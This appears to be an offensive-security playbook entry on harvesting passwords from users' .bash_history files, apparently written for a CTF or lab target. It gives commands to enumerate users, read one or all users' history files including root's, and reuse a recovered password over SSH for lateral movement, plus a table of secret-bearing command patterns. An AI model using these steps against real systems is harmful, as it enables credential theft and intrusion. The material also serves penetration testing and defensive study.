# Credential Discovery via `.bash_history`

Used on: **IDE**

Users frequently type credentials directly on the command line (database logins, API calls, password flags), and those commands are saved verbatim in `~/.bash_history`. Reading this file from a compromised account or via path traversal can yield reusable passwords.

## When to Use

- Shell access is gained as a user that can read home directories
- A `~/.bash_history` file is discovered to be readable
- Command patterns like `mysql -u`, `curl -u`, `export PASS=`, or `sshpass -p` appear in history logs

## Prerequisites

- Shell access as any user that can read the target's home directory
- Target user ran commands with inline credentials

## Steps

### 1. Find users on the system
```bash
cat /etc/passwd | grep "bash\|sh$"
```

### 2. Find files owned by a target user
```bash
find / -user drac 2>/dev/null
```

### 3. Read bash history
```bash
cat /home/drac/.bash_history
```

**Example output containing credentials:**
```
mysql -u drac -p 'Th3dRaCULa1sR3aL'
```

### 4. Try credentials for lateral movement
```bash
ssh drac@TARGET_IP
# Password: Th3dRaCULa1sR3aL
```

## Sweep All Users

```bash
cat /home/*/.bash_history /root/.bash_history 2>/dev/null
```

## What to Look For

| Pattern | Likely Secret |
|---------|--------------|
| `mysql -u <user> -p` | Database password |
| `curl -u user:pass` | HTTP basic auth |
| `export PASS=` | Environment variable assignment |
| `sshpass -p` | SSH password |
| `aws configure` | AWS credentials |
| `echo <hash>` | Hash for offline cracking |

## Related

- see `linux-enumeration.md` (section 4 — credential hunting)


